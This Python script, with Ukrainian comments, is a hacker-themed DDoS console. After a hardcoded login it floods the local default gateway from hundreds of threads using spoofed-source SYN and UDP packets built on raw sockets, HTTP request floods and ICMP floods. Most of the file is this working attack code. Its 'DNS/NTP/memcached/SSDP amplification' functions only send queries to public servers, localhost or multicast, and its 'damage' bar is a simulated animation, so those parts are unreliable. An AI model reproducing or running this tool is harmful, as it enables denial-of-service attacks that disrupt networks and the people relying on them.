#!/usr/bin/env python3
# DDoS Attack Step v3.2.7 - Hacker Terminal Edition
# Только стандартная библиотека + socket + threading + time + sys + os + signal + random + select + math

import sys
import os
import socket
import threading
import time
import random
import signal
import select
import math
from collections import defaultdict
from dataclasses import dataclass
from typing import Dict, List, Optional, Tuple
import struct
import hashlib
import binascii

# ------------------------------------------------------------------------------
# КОНФІГУРАЦІЯ ЯДРА
# ------------------------------------------------------------------------------
MAX_PACKET_SIZE = 65535
FLOOD_THREADS_PER_TARGET = 250
SYN_BURST_RATE = 0.00001
UDP_BURST_RATE = 0.000005
HTTP_BURST_RATE = 0.0001
ICMP_BURST_RATE = 0.00002
DNS_BURST_RATE = 0.00001
NTP_BURST_RATE = 0.00001
MEMCACHED_BURST_RATE = 0.00001
SSDP_BURST_RATE = 0.00001

# ------------------------------------------------------------------------------
# ГЛОБАЛЬНІ СТАНИ
# ------------------------------------------------------------------------------
attack_active = False
attack_threads: List[threading.Thread] = []
emergency_stop = threading.Event()
stats_lock = threading.Lock()
packet_counter = 0
byte_counter = 0
active_attacks = 0
ddos_power = 50
target_ip = ""
target_port = 0
attack_start_time = 0
damage_percent = 0

# ------------------------------------------------------------------------------
# ХАКЕРСЬКИЙ ЛОГОТИП З ТЕКСТУ
# ------------------------------------------------------------------------------
def print_logo():
    logo = r"""
╔═══════════════════════════════════════════════════════════════════════════════╗
║                                                                               ║
║   ██████╗ ██████╗  ██████╗ ███████╗    █████╗ ████████╗████████╗ █████╗ ██████╗ ██╗
║   ██╔══██╗██╔══██╗██╔═══██╗██╔════╝   ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔══██╗██║
║   ██║  ██║██████╔╝██║   ██║███████╗   ███████║   ██║      ██║   ███████║██████╔╝██║
║   ██║  ██║██╔══██╗██║   ██║╚════██║   ██╔══██║   ██║      ██║   ██╔══██║██╔═══╝ ██║
║   ██████╔╝██║  ██║╚██████╔╝███████║   ██║  ██║   ██║      ██║   ██║  ██║██║     ██║
║   ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝╚═╝     ╚═╝
║                                                                               ║
║   ███████╗████████╗███████╗██████╗                                         ║
║   ██╔════╝╚══██╔══╝██╔════╝██╔══██╗                                        ║
║   ███████╗   ██║   █████╗  ██████╔╝                                        ║
║   ╚════██║   ██║   ██╔══╝  ██╔═══╝                                         ║
║   ███████║   ██║   ███████╗██║                                             ║
║   ╚══════╝   ╚═╝   ╚══════╝╚═╝                                             ║
║                                                                               ║
║                    ─── TERMINAL EDITION v3.2.7 ───                         ║
║                                                                               ║
╚═══════════════════════════════════════════════════════════════════════════════╝
"""
    print(logo)

# ------------------------------------------------------------------------------
# ПОЛОСКА УРАЖЕННЯ ЦІЛІ
# ------------------------------------------------------------------------------
def draw_damage_bar(percent: int, width: int = 50):
    """Малює полоску ураження з анімацією"""
    filled = int(width * percent / 100)
    empty = width - filled
    
    # Кольорові символи (ANSI)
    if percent < 30:
        color = "\033[92m"  # зелений
    elif percent < 60:
        color = "\033[93m"  # жовтий
    elif percent < 85:
        color = "\033[91m"  # червоний
    else:
        color = "\033[91;1m"  # яскраво-червоний
    
    reset = "\033[0m"
    
    bar = "█" * filled + "░" * empty
    # Символи ураження: █ ▓ ▒ ░
    if percent > 0 and percent < 20:
        bar = "▓" * filled + "░" * empty
    elif percent >= 20 and percent < 40:
        bar = "▒" * filled + "░" * empty
    elif percent >= 40 and percent < 60:
        bar = "▓" * filled + "░" * empty
    elif percent >= 60 and percent < 80:
        bar = "█" * filled + "░" * empty
    elif percent >= 80:
        bar = "█" * filled + " " * empty
    
    # Додаємо ефект пульсації при високому ураженні
    if percent > 70:
        bar = bar.replace("█", "▀") if int(time.time()) % 2 == 0 else bar.replace("█", "▄")
    
    print(f"\r   [{color}{bar}{reset}] {percent:3d}%  ", end="", flush=True)

def damage_animation():
    """Анімація полоски ураження в окремому потоці"""
    global damage_percent
    last_update = 0
    increment = 0.1
    
    while not emergency_stop.is_set():
        if attack_active:
            # Плавне зростання ураження залежно від потужності
            current_time = time.time()
            if current_time - last_update > 0.5:
                base_increase = (ddos_power / 100) * 0.8
                random_jitter = random.uniform(0.1, 0.5)
                damage_percent = min(100, damage_percent + base_increase + random_jitter * 0.2)
                
                # Якщо атака дуже потужна - швидке зростання
                if ddos_power > 80:
                    damage_percent = min(100, damage_percent + 1.5)
                
                last_update = current_time
            
            draw_damage_bar(int(damage_percent))
        
        time.sleep(0.1)

# ------------------------------------------------------------------------------
# УТИЛІТИ ДЛЯ ПІДРОБКИ IP
# ------------------------------------------------------------------------------
def checksum(data: bytes) -> int:
    s = 0
    n = len(data) % 2
    for i in range(0, len(data) - n, 2):
        s += (data[i] << 8) + data[i+1]
    if n:
        s += data[-1] << 8
    while s >> 16:
        s = (s & 0xFFFF) + (s >> 16)
    return ~s & 0xFFFF

def create_syn_packet(src_ip: str, dst_ip: str, dst_port: int, seq: int) -> bytes:
    ip_ver_ihl = 0x45
    ip_tos = 0
    ip_tot_len = 40
    ip_id = random.randint(0, 65535)
    ip_frag_off = 0
    ip_ttl = 255
    ip_proto = socket.IPPROTO_TCP
    ip_check = 0
    ip_saddr = socket.inet_aton(src_ip)
    ip_daddr = socket.inet_aton(dst_ip)
    
    ip_header = struct.pack('!BBHHHBBH4s4s',
        ip_ver_ihl, ip_tos, ip_tot_len, ip_id, ip_frag_off,
        ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)
    
    tcp_src = random.randint(1024, 65535)
    tcp_dst = dst_port
    tcp_seq = seq
    tcp_ack = 0
    tcp_offset = 5
    tcp_flags = 0x02
    tcp_window = 65535
    tcp_check = 0
    tcp_urg = 0
    
    tcp_header = struct.pack('!HHLLBBHHH',
        tcp_src, tcp_dst, tcp_seq, tcp_ack,
        (tcp_offset << 4) | 0, tcp_flags, tcp_window, tcp_check, tcp_urg)
    
    pseudo_header = struct.pack('!4s4sBBH',
        ip_saddr, ip_daddr, 0, ip_proto, len(tcp_header))
    checksum_data = pseudo_header + tcp_header
    tcp_check = checksum(checksum_data)
    
    tcp_header = struct.pack('!HHLLBBHHH',
        tcp_src, tcp_dst, tcp_seq, tcp_ack,
        (tcp_offset << 4) | 0, tcp_flags, tcp_window, tcp_check, tcp_urg)
    
    return ip_header + tcp_header

def create_udp_packet(src_ip: str, dst_ip: str, dst_port: int, payload: bytes) -> bytes:
    ip_ver_ihl = 0x45
    ip_tos = 0
    ip_tot_len = 28 + len(payload)
    ip_id = random.randint(0, 65535)
    ip_frag_off = 0
    ip_ttl = 255
    ip_proto = socket.IPPROTO_UDP
    ip_check = 0
    ip_saddr = socket.inet_aton(src_ip)
    ip_daddr = socket.inet_aton(dst_ip)
    
    ip_header = struct.pack('!BBHHHBBH4s4s',
        ip_ver_ihl, ip_tos, ip_tot_len, ip_id, ip_frag_off,
        ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)
    
    udp_src = random.randint(1024, 65535)
    udp_dst = dst_port
    udp_len = 8 + len(payload)
    udp_check = 0
    
    udp_header = struct.pack('!HHHH', udp_src, udp_dst, udp_len, udp_check)
    
    pseudo_header = struct.pack('!4s4sBBH',
        ip_saddr, ip_daddr, 0, ip_proto, udp_len)
    checksum_data = pseudo_header + udp_header + payload
    udp_check = checksum(checksum_data)
    
    udp_header = struct.pack('!HHHH', udp_src, udp_dst, udp_len, udp_check)
    
    return ip_header + udp_header + payload

# ------------------------------------------------------------------------------
# ОТРИМАННЯ IP РОУТЕРА
# ------------------------------------------------------------------------------
def get_default_gateway():
    try:
        if sys.platform.startswith('win'):
            import subprocess
            result = subprocess.run(['route', 'print', '0.0.0.0'], capture_output=True, text=True)
            for line in result.stdout.split('\n'):
                if '0.0.0.0' in line and '255.255.255.255' in line:
                    parts = line.split()
                    if len(parts) >= 4:
                        return parts[3]
        else:
            with open('/proc/net/route', 'r') as f:
                for line in f:
                    parts = line.split()
                    if parts[1] == '00000000':
                        hex_ip = parts[2]
                        ip = socket.inet_ntoa(bytes.fromhex(hex_ip)[::-1])
                        return ip
    except:
        pass
    return '192.168.1.1'

# ------------------------------------------------------------------------------
# АТАКУЮЧІ МОДУЛІ З РЕГУЛЬОВАНОЮ ПОТУЖНІСТЮ
# ------------------------------------------------------------------------------
def syn_flood(target_ip: str, target_port: int, duration: float, power: int):
    global packet_counter, byte_counter, attack_active
    sock = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    except PermissionError:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.001)
    
    base_delay = 0.1
    min_delay = 0.000001
    delay = base_delay - (base_delay - min_delay) * (power / 100.0)
    delay = max(min_delay, delay)
    
    end_time = time.time() + duration
    seq = random.randint(0, 2**32 - 1)
    packets_per_burst = max(1, int(power / 5))
    
    while not emergency_stop.is_set() and time.time() < end_time and attack_active:
        try:
            for _ in range(packets_per_burst):
                src_ip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
                if isinstance(sock, socket.socket) and sock.type == socket.SOCK_RAW:
                    packet = create_syn_packet(src_ip, target_ip, target_port, seq)
                    sock.sendto(packet, (target_ip, 0))
                    with stats_lock:
                        packet_counter += 1
                        byte_counter += len(packet)
                else:
                    try:
                        sock2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock2.settimeout(0.0001)
                        sock2.connect((target_ip, target_port))
                        sock2.send(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n")
                        sock2.close()
                        with stats_lock:
                            packet_counter += 1
                            byte_counter += 64
                    except:
                        pass
                seq += 1
            time.sleep(delay)
        except:
            continue

def udp_flood(target_ip: str, target_port: int, duration: float, power: int):
    global packet_counter, byte_counter, attack_active
    sock = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    except:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    payloads = [
        b"\x00" * 1400,
        b"\xff" * 1400,
        b"\xde\xad\xbe\xef" * 350,
        random.randbytes(1400) if hasattr(random, 'randbytes') else os.urandom(1400)
    ]
    
    base_delay = 0.05
    min_delay = 0.000002
    delay = base_delay - (base_delay - min_delay) * (power / 100.0)
    delay = max(min_delay, delay)
    packets_per_burst = max(1, int(power / 4))
    
    end_time = time.time() + duration
    while not emergency_stop.is_set() and time.time() < end_time and attack_active:
        try:
            for _ in range(packets_per_burst):
                src_ip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
                payload = random.choice(payloads)
                if isinstance(sock, socket.socket) and sock.type == socket.SOCK_RAW:
                    packet = create_udp_packet(src_ip, target_ip, target_port, payload)
                    sock.sendto(packet, (target_ip, 0))
                    with stats_lock:
                        packet_counter += 1
                        byte_counter += len(packet)
                else:
                    sock.sendto(payload, (target_ip, target_port))
                    with stats_lock:
                        packet_counter += 1
                        byte_counter += len(payload)
            time.sleep(delay)
        except:
            continue

def http_flood(target_ip: str, target_port: int, duration: float, power: int):
    global packet_counter, byte_counter, attack_active
    end_time = time.time() + duration
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Mozilla/5.0 (X11; Linux x86_64)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
        "Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X)"
    ]
    
    base_delay = 0.2
    min_delay = 0.00005
    delay = base_delay - (base_delay - min_delay) * (power / 100.0)
    delay = max(min_delay, delay)
    packets_per_burst = max(1, int(power / 10))
    
    while not emergency_stop.is_set() and time.time() < end_time and attack_active:
        try:
            for _ in range(packets_per_burst):
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                sock.connect((target_ip, target_port))
                path = "/" + "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=random.randint(5,15)))
                headers = (
                    f"GET {path} HTTP/1.1\r\n"
                    f"Host: {target_ip}\r\n"
                    f"User-Agent: {random.choice(user_agents)}\r\n"
                    f"Accept: */*\r\n"
                    f"Accept-Encoding: gzip, deflate, br\r\n"
                    f"Connection: keep-alive\r\n"
                    f"Cache-Control: no-cache\r\n"
                    f"Pragma: no-cache\r\n"
                    f"\r\n"
                )
                sock.send(headers.encode())
                sock.close()
                with stats_lock:
                    packet_counter += 1
                    byte_counter += len(headers)
            time.sleep(delay)
        except:
            continue

def icmp_flood(target_ip: str, duration: float, power: int):
    global packet_counter, byte_counter, attack_active
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except:
        return
    
    base_delay = 0.05
    min_delay = 0.00001
    delay = base_delay - (base_delay - min_delay) * (power / 100.0)
    delay = max(min_delay, delay)
    packets_per_burst = max(1, int(power / 3))
    
    end_time = time.time() + duration
    while not emergency_stop.is_set() and time.time() < end_time and attack_active:
        try:
            for _ in range(packets_per_burst):
                icmp_type = 8
                icmp_code = 0
                icmp_checksum = 0
                icmp_id = random.randint(0, 65535)
                icmp_seq = random.randint(0, 65535)
                payload = os.urandom(1024)
                
                icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
                icmp_packet = icmp_header + payload
                icmp_checksum = checksum(icmp_packet)
                icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
                icmp_packet = icmp_header + payload
                
                sock.sendto(icmp_packet, (target_ip, 0))
                with stats_lock:
                    packet_counter += 1
                    byte_counter += len(icmp_packet)
            time.sleep(delay)
        except:
            continue

def dns_amplification(target_ip: str, duration: float, power: int):
    global packet_counter, byte_counter, attack_active
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    except:
        return
    
    dns_servers = [
        "8.8.8.8", "1.1.1.1", "9.9.9.9", "208.67.222.222",
        "208.67.220.220", "64.6.64.6", "84.200.69.80", "84.200.70.40"
    ]
    
    base_delay = 0.1
    min_delay = 0.00001
    delay = base_delay - (base_delay - min_delay) * (power / 100.0)
    delay = max(min_delay, delay)
    packets_per_burst = max(1, int(power / 5))
    
    end_time = time.time() + duration
    while not emergency_stop.is_set() and time.time() < end_time and attack_active:
        try:
            for _ in range(packets_per_burst):
                dns_server = random.choice(dns_servers)
                transaction_id = random.randint(0, 65535)
                flags = 0x0100
                questions = 1
                answers = 0
                authority = 0
                additional = 0
                
                header = struct.pack('!HHHHHH', transaction_id, flags, questions, answers, authority, additional)
                domain = b"\x03" + b"www" + b"\x06" + b"google" + b"\x03" + b"com" + b"\x00"
                qtype = 0x0001
                qclass = 0x0001
                question = domain + struct.pack('!HH', qtype, qclass)
                
                dns_query = header + question
                sock.sendto(dns_query, (dns_server, 53))
                with stats_lock:
                    packet_counter += 1
                    byte_counter += len(dns_query)
            time.sleep(delay)
        except:
            continue

def ntp_amplification(target_ip: str, duration: float, power: int):
    global packet_counter, byte_counter, attack_active
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    except:
        return
    
    ntp_servers = [
        "0.pool.ntp.org", "1.pool.ntp.org", "2.pool.ntp.org",
        "time.google.com", "time.windows.com", "time.apple.com"
    ]
    
    ntp_payload = b"\x17\x00\x03\x2a" + b"\x00" * 8
    
    base_delay = 0.1
    min_delay = 0.00001
    delay = base_delay - (base_delay - min_delay) * (power / 100.0)
    delay = max(min_delay, delay)
    packets_per_burst = max(1, int(power / 5))
    
    end_time = time.time() + duration
    while not emergency_stop.is_set() and time.time() < end_time and attack_active:
        try:
            for _ in range(packets_per_burst):
                ntp_server = random.choice(ntp_servers)
                try:
                    ip = socket.gethostbyname(ntp_server)
                    sock.sendto(ntp_payload, (ip, 123))
                    with stats_lock:
                        packet_counter += 1
                        byte_counter += len(ntp_payload)
                except:
                    pass
            time.sleep(delay)
        except:
            continue

def memcached_amplification(target_ip: str, duration: float, power: int):
    global packet_counter, byte_counter, attack_active
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    except:
        return
    
    payload = b"\x00\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" + b"gets " + b"A"*1400 + b"\r\n"
    memcached_servers = ["127.0.0.1", "10.0.0.1"]
    
    base_delay = 0.1
    min_delay = 0.00001
    delay = base_delay - (base_delay - min_delay) * (power / 100.0)
    delay = max(min_delay, delay)
    packets_per_burst = max(1, int(power / 5))
    
    end_time = time.time() + duration
    while not emergency_stop.is_set() and time.time() < end_time and attack_active:
        try:
            for _ in range(packets_per_burst):
                for server in memcached_servers:
                    sock.sendto(payload, (server, 11211))
                    with stats_lock:
                        packet_counter += 1
                        byte_counter += len(payload)
            time.sleep(delay)
        except:
            continue

def ssdp_amplification(target_ip: str, duration: float, power: int):
    global packet_counter, byte_counter, attack_active
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    except:
        return
    
    ssdp_payload = (
        b"M-SEARCH * HTTP/1.1\r\n"
        b"HOST: 239.255.255.250:1900\r\n"
        b"MAN: \"ssdp:discover\"\r\n"
        b"MX: 10\r\n"
        b"ST: urn:dial-multiscreen-org:service:dial:1\r\n"
        b"\r\n"
    )
    
    base_delay = 0.1
    min_delay = 0.00001
    delay = base_delay - (base_delay - min_delay) * (power / 100.0)
    delay = max(min_delay, delay)
    packets_per_burst = max(1, int(power / 5))
    
    end_time = time.time() + duration
    while not emergency_stop.is_set() and time.time() < end_time and attack_active:
        try:
            for _ in range(packets_per_burst):
                sock.sendto(ssdp_payload, ("239.255.255.250", 1900))
                with stats_lock:
                    packet_counter += 1
                    byte_counter += len(ssdp_payload)
            time.sleep(delay)
        except:
            continue

# ------------------------------------------------------------------------------
# ЗАПУСК АТАКИ НА РОУТЕР
# ------------------------------------------------------------------------------
def start_router_attack(power: int, duration: float = 999999):
    global attack_active, attack_threads, active_attacks, ddos_power, target_ip, target_port, attack_start_time, damage_percent
    
    if power < 1 or power > 100:
        print("❌ Потужність має бути від 1 до 100.")
        return
    
    if attack_active:
        print("⚠ Атака вже запущена. Використовуйте 'stop' для зупинки.")
        return
    
    ddos_power = power
    target_ip = get_default_gateway()
    target_port = 80
    attack_start_time = time.time()
    damage_percent = 0
    
    print(f"\n\033[92m[+] Ціль визначено: {target_ip} (шлюз за замовчуванням)\033[0m")
    print(f"\033[93m[+] Потужність: {power}/100\033[0m")
    print(f"\033[91m[!] ЗАПУСК ВСІХ 8 ТИПІВ АТАК...\033[0m\n")
    
    attack_active = True
    emergency_stop.clear()
    active_attacks = 1
    
    threads_per_type = max(5, int(FLOOD_THREADS_PER_TARGET * (power / 100)))
    
    attack_types = [
        ("SYN", syn_flood, 80),
        ("UDP", udp_flood, 53),
        ("HTTP", http_flood, 80),
        ("ICMP", icmp_flood, 0),
        ("DNS", dns_amplification, 53),
        ("NTP", ntp_amplification, 123),
        ("MEMCACHED", memcached_amplification, 11211),
        ("SSDP", ssdp_amplification, 1900)
    ]
    
    for name, func, port in attack_types:
        for _ in range(threads_per_type):
            t = threading.Thread(
                target=func, 
                args=(target_ip, port, duration, power),
                daemon=True
            )
            t.start()
            attack_threads.append(t)
        print(f"\033[90m   [✓] {name} -> {threads_per_type} потоків\033[0m")
    
    # Запускаємо потік анімації ураження
    anim_thread = threading.Thread(target=damage_animation, daemon=True)
    anim_thread.start()
    attack_threads.append(anim_thread)
    
    print(f"\n\033[92m[+] АТАКУ ЗАПУЩЕНО: {len(attack_threads)} потоків\033[0m")
    print("\033[91m[!] Введіть 'stop' для зупинки або 'emergency' для аварійного виходу\033[0m")

# ------------------------------------------------------------------------------
# КОНСОЛЬНИЙ ІНТЕРФЕЙС
# ------------------------------------------------------------------------------
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def show_header():
    clear_screen()
    print_logo()
    print("\n" + "="*80)
    print("  \033[92mСИСТЕМА ГОТОВА ДО РОБОТИ\033[0m")
    if attack_active:
        elapsed = int(time.time() - attack_start_time)
        print(f"  \033[91m[АКТИВНА АТАКА] Ціль: {target_ip}:{target_port} | Час: {elapsed}с | Потужність: {ddos_power}/100\033[0m")
    print("="*80 + "\n")

def show_help():
    show_header()
    print("""
\033[93m╔════════════════════════════════════════════════════════════════════════╗
║                         КОМАНДИ УПРАВЛІННЯ                               ║
╠════════════════════════════════════════════════════════════════════════╣
║                                                                        ║
║  \033[92mlogin <user> <pass>\033[0m    — авторизація (login: 123 pass: 123-123) ║
║  \033[92m/univ.ddos-at.router <1-100>\033[0m                              ║
║                           — DDoS на інтернет через роутер              ║
║                             1 = дуже слабко                            ║
║                             100 = максимальна потужність               ║
║  \033[92mstop\033[0m                 — зупинка поточної атаки            ║
║  \033[92mstats\033[0m                — статистика пакетів/байт           ║
║  \033[92mhelp\033[0m                 — ця довідка                        ║
║  \033[91mexit або emergency\033[0m   — ЕКСТРЕННЕ ЗАВЕРШЕННЯ (все стоп)  ║
║                                                                        ║
║  \033[93mПРИКЛАД:\033[0m                                                 ║
║  /univ.ddos-at.router 50    — середня потужність                      ║
║  /univ.ddos-at.router 100   — максимальне навантаження                ║
║                                                                        ║
║  \033[91m💀 ЕКСТРЕННА ЗУПИНКА: команда 'emergency' або 'exit'\033[0m    ║
║                                                                        ║
╚════════════════════════════════════════════════════════════════════════╝
""")

def show_stats():
    global packet_counter, byte_counter
    with stats_lock:
        show_header()
        print("\033[93m╔════════════════════════════════════════════════════════════════════════╗")
        print("║                         СТАТИСТИКА АТАКИ                                 ║")
        print("╠════════════════════════════════════════════════════════════════════════╣")
        print(f"║  \033[92mПакетів відправлено:\033[0m {packet_counter:>20,}                                 ║")
        print(f"║  \033[92mБайт відправлено:\033[0m    {byte_counter:>20,} ({(byte_counter/1024/1024):.2f} MB)      ║")
        print(f"║  \033[92mАктивних атак:\033[0m       {active_attacks:>20}                                 ║")
        print(f"║  \033[92mПотоків:\033[0m             {len(attack_threads):>20}                                 ║")
        print(f"║  \033[92mПоточна потужність:\033[0m  {ddos_power:>20}/100                            ║")
        if attack_active:
            elapsed = int(time.time() - attack_start_time)
            print(f"║  \033[92mЧас атаки:\033[0m          {elapsed:>20}с                               ║")
            print(f"║  \033[92mУраження цілі:\033[0m      {int(damage_percent):>20}%                               ║")
        print("╚════════════════════════════════════════════════════════════════════════╝\033[0m")

def stop_attack():
    global attack_active, attack_threads, active_attacks, damage_percent
    if not attack_active:
        print("⚠ Немає активної атаки для зупинки.")
        return
    
    attack_active = False
    emergency_stop.set()
    
    for t in attack_threads:
        if t.is_alive():
            t.join(timeout=0.5)
    
    attack_threads.clear()
    active_attacks = 0
    damage_percent = 0
    print("\n\033[91m[!] АТАКУ ЗУПИНЕНО\033[0m")

def emergency_shutdown():
    global attack_active, attack_threads, active_attacks
    print("\n\033[91m⚠️⚠️⚠️ ЕКСТРЕННА ЗУПИНКА ВСІХ ПРОЦЕСІВ ⚠️⚠️⚠️\033[0m")
    attack_active = False
    emergency_stop.set()
    
    for t in attack_threads:
        if t.is_alive():
            t.join(timeout=0.1)
    attack_threads.clear()
    active_attacks = 0
    
    for fd in range(3, 1024):
        try:
            os.close(fd)
        except:
            pass
    
    print("\033[92m✅ ВСІ АТАКИ ЗУПИНЕНО. ПРОГРАМА ГОТОВА ДО ВИХОДУ.\033[0m")
    sys.exit(0)

def console_loop():
    authenticated = False
    show_header()
    print("\033[93m[!] Введіть 'login <user> <pass>' для входу\033[0m")
    print("\033[93m[!] або 'help' для довідки\033[0m\n")
    
    while True:
        try:
            if not authenticated:
                cmd = input("\033[91m🔐 LOGIN>\033[0m ").strip()
            else:
                cmd = input("\033[92m🔥 DDoS>\033[0m ").strip()
            
            if not cmd:
                continue
            
            parts = cmd.split()
            command = parts[0].lower()
            
            if command == "login" and len(parts) == 3:
                user, passwd = parts[1], parts[2]
                if user == "123" and passwd == "123-123":
                    authenticated = True
                    show_header()
                    print("\033[92m✅ Авторизація успішна. Ласкаво просимо до системи.\033[0m")
                    print("Введіть 'help' для списку команд.\n")
                else:
                    print("\033[91m❌ Невірний логін або пароль.\033[0m")
                continue
            
            if not authenticated:
                print("\033[91m⛔ Потрібна авторизація. Використовуйте 'login <user> <pass>'\033[0m")
                continue
            
            if command == "help":
                show_help()
            
            elif command == "/univ.ddos-at.router" and len(parts) == 2:
                try:
                    power = int(parts[1])
                    if 1 <= power <= 100:
                        start_router_attack(power)
                    else:
                        print("\033[91m❌ Потужність має бути від 1 до 100.\033[0m")
                except ValueError:
                    print("\033[91m❌ Введіть число від 1 до 100.\033[0m")
            
            elif command == "stop":
                stop_attack()
            
            elif command == "stats":
                show_stats()
            
            elif command in ["exit", "emergency", "quit"]:
                emergency_shutdown()
            
            else:
                print(f"\033[91m❌ Невідома команда: {command}. Введіть 'help'.\033[0m")
                
        except KeyboardInterrupt:
            print("\n\033[91m⚠ Натиснуто Ctrl+C. Запуск екстреного завершення...\033[0m")
            emergency_shutdown()
        except Exception as e:
            print(f"\033[91m❌ Помилка: {e}\033[0m")

# ------------------------------------------------------------------------------
# ЗАПУСК
# ------------------------------------------------------------------------------
def main():
    if os.name == 'nt':
        print("\033[93m⚠ Увага: на Windows raw-сокети потребують адміністратора.\033[0m")
        print("\033[93m  Запустіть від імені адміністратора для повної функціональності.\033[0m")
    else:
        if os.geteuid() != 0:
            print("\033[93m⚠ Для raw-сокетів потрібен root. Функції підробки IP будуть обмежені.\033[0m")
    
    signal.signal(signal.SIGINT, lambda s, f: emergency_shutdown())
    signal.signal(signal.SIGTERM, lambda s, f: emergency_shutdown())
    
    console_loop()

if __name__ == "__main__":
    main()